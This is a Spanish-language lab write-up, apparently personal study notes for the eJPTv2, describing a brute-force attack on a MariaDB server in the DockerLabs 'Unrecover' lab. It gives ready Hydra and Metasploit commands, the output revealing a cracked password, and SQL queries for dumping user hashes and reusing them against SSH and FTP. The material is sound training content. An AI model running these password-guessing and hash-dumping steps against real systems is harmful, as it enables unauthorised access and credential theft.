# Fuerza Bruta contra Bases de Datos

> [!info] Idea principal
> Los gestores de bases de datos (**MySQL/MariaDB**, PostgreSQL, MSSQL, MongoDB...) tambien son servicios de autenticacion, asi que se pueden atacar con Hydra igual que SSH o FTP. La clave esta en **conseguir primero un nombre de usuario valido** en otra parte de la maquina (normalmente la web) y usarlo como punto de partida.

> [!warning] Importante
> Laboratorio **Unrecover** de DockerLabs, desplegado en local (`172.17.0.2`). Usar estas tecnicas solo en entornos propios o con permiso.

## Por que Atacar el Puerto 3306

Una base de datos expuesta es un objetivo muy rentable:

- Suele guardar **credenciales de la aplicacion web** (hashes de usuarios).
- Da acceso a datos sensibles sin necesidad de shell.
- Con privilegios suficientes puede servir para **escribir ficheros** en el sistema y saltar a RCE.

> [!note] Lo normal es que no este expuesta
> En produccion MySQL suele escuchar solo en `127.0.0.1`. Si `nmap` te devuelve un 3306 abierto desde fuera, ya es un hallazgo en si mismo.

### Superficie de ataque

| Puerto | Servicio | Para que me sirve |
|---|---|---|
| 21 | vsftpd 3.0.3 | Otro servicio con login (version no vulnerable) |
| 22 | OpenSSH 9.2p1 | Acceso final si reutilizan credenciales |
| 80 | Apache — "Zoo de Capybaras" | **Fuente de nombres de usuario** |
| 3306 | MariaDB 10.11.6 | El objetivo de la fuerza bruta |

## Paso 2: Sacar el Usuario de la Web

Antes de tirar diccionarios a ciegas, reviso el puerto 80. En la web ("Zoo de Capybaras") aparece el usuario **`capybara`**.

> [!tip] Esto es lo importante de todo el laboratorio
> Hydra contra una base de datos sin usuario valido es tirar el tiempo: serian millones de combinaciones usuario x contraseña. Con **un solo usuario confirmado** el ataque pasa de inviable a cuestion de segundos.
>
> Sitios donde suelen aparecer nombres de usuario: textos de la web, `mailto:`, autores de posts, comentarios en el codigo fuente (`Ctrl+U`), cabeceras HTTP, `/robots.txt` y errores de la aplicacion.

## Paso 3: Fuerza Bruta con Hydra contra MySQL

```bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2
```

Resultado:

```text
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-08 18:22:31
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybara   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-08 18:22:33
```

> [!success] Credencial encontrada
> Usuario: `capybara` — Contraseña: `password1` — Servicio: `mysql://172.17.0.2:3306`

### Parametros usados

- `-l capybara`: un unico usuario conocido (minuscula). Con `-L` seria una lista.
- `-P /usr/share/wordlists/rockyou.txt`: diccionario de contraseñas (mayuscula).
- `mysql://172.17.0.2`: modulo de Hydra + objetivo. Usa el puerto 3306 por defecto.

> [!note] "Reduced number of tasks to 4"
> Hydra baja solo los hilos de 16 a 4 porque **MySQL no tolera muchas conexiones en paralelo**. No es un error: si forzara mas hilos con `-t`, el servidor empezaria a rechazar conexiones y saldrian falsos negativos.

> [!warning] Cuidado con el bloqueo por intentos fallidos
> MariaDB cuenta las conexiones fallidas por host (`max_connect_errors`). Si te pasas de intentos puede **bloquear tu IP** y tendrias que esperar o que alguien ejecute `FLUSH HOSTS`. Otra razon para no subir los hilos.

> [!example] Por que ha tardado 2 segundos
> `password1` esta entre las primeras lineas de `rockyou.txt`. De las 14.344.399 combinaciones posibles solo hizo falta probar un puñado. Con una contraseña realista este mismo ataque podria no terminar nunca.

## Paso 4: Conectarse a la Base de Datos

Con la credencial en mano, toca entrar con el cliente de MySQL.

```bash
mysql -u capybara -ppassword1 -h 172.17.0.2
```

Pero devuelve un error:

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

> [!bug] Que esta pasando
> No es que la credencial este mal — Hydra ya la valido. El problema es del **cliente**: las versiones recientes del cliente de MariaDB exigen conexion cifrada por defecto, y este servidor no tiene TLS configurado. El cliente corta la conexion antes de intentar autenticarse.

Se soluciona desactivando el requisito de SSL en el cliente:

```bash
mysql -u capybara -ppassword1 -h 172.17.0.2 --ssl=0
```

Si esa opcion no la reconoce tu cliente, la alternativa segun version es:

```bash
mysql -u capybara -ppassword1 -h 172.17.0.2 --skip-ssl
```

> [!tip] No dejes la contraseña en el comando
> `-ppassword1` (pegado, sin espacio) queda guardado en el historial de la shell y es visible en `ps` para cualquier usuario de la maquina. Mejor poner solo `-p` y que la pida por teclado:
> ```bash
> mysql -u capybara -h 172.17.0.2 --ssl=0 -p
> ```

> [!note] Nivel de esta maquina
> Unrecover va bastante mas alla de lo que pide la **eJPTv2**. Para el examen basta con saber identificar el 3306, hacer la fuerza bruta y conectarse; detalles como el error de TLS no suelen aparecer.

## Paso 5: Enumerar la Base de Datos

Una vez dentro, el objetivo es localizar credenciales u otros datos sensibles.

```sql
SHOW DATABASES;
USE nombre_db;
SHOW TABLES;
DESCRIBE nombre_tabla;
SELECT * FROM nombre_tabla;
```

Consultas utiles nada mas entrar:

```sql
SELECT user();              -- con que usuario estoy conectado
SELECT version();           -- version del gestor
SHOW GRANTS;                -- que privilegios tengo
SELECT user, host, password FROM mysql.user;   -- hashes de los usuarios de la DB
```

> [!tip] Que buscar
> Tablas tipo `users`, `usuarios`, `admin`, `login` o `accounts`. Los hashes que saques de ahi se crackean offline con John o Hashcat, y despues se prueban contra SSH y FTP: la **reutilizacion de contraseñas** es lo que convierte un acceso a la DB en acceso al sistema.

## Comandos Utiles

### Fuerza bruta a MySQL / MariaDB

```bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2
```

### Otras bases de datos

```bash
hydra -l usuario -P /usr/share/wordlists/rockyou.txt postgres://172.17.0.2
hydra -l sa      -P /usr/share/wordlists/rockyou.txt mssql://172.17.0.2
hydra -l usuario -P /usr/share/wordlists/rockyou.txt mongodb://172.17.0.2
```

### Usuario desconocido (lista de usuarios)

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2
```

### La misma fuerza bruta desde Metasploit

```text
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 172.17.0.2
set USERNAME capybara
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

### Conectarse al servidor

```bash
mysql -u capybara -h 172.17.0.2 --ssl=0 -p
```

### Reconocimiento de MySQL con Nmap

```bash
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users 172.17.0.2
```

## Flujo Resumido

> [!example] Pasos tipicos
> 1. `nmap -p- -sS -sC -sV` e identificar el puerto de base de datos (3306, 5432, 1433...).
> 2. Revisar la web del puerto 80 para **sacar nombres de usuario**.
> 3. Lanzar Hydra con `-l usuario` y `-P rockyou.txt` contra el modulo de la DB.
> 4. Dejar que Hydra ajuste solo los hilos (MySQL no admite paralelismo alto).
> 5. Conectarse con el cliente `mysql` (con `--ssl=0` si da error de TLS).
> 6. Enumerar: `SHOW DATABASES` → `SHOW TABLES` → `SELECT *`.
> 7. Extraer hashes, crackearlos offline y probarlos en SSH/FTP.

## Checklist Rapido

- [ ] Confirmar que tengo permiso para atacar la maquina.
- [ ] `nmap` completo y puerto de base de datos identificado.
- [ ] Revisar el script `mysql-info` del `-sC`.
- [ ] Buscar nombres de usuario en la web antes de hacer fuerza bruta.
- [ ] Probar credenciales por defecto y contraseña vacia (`root` sin password).
- [ ] Hydra con `-l` + `-P` y **sin subir los hilos**.
- [ ] Anotar la credencial encontrada.
- [ ] Conectarse con `mysql` (usar `--ssl=0` si sale el `ERROR 2026`).
- [ ] Enumerar bases de datos, tablas y columnas.
- [ ] Volcar hashes de usuarios y probarlos en los demas servicios.
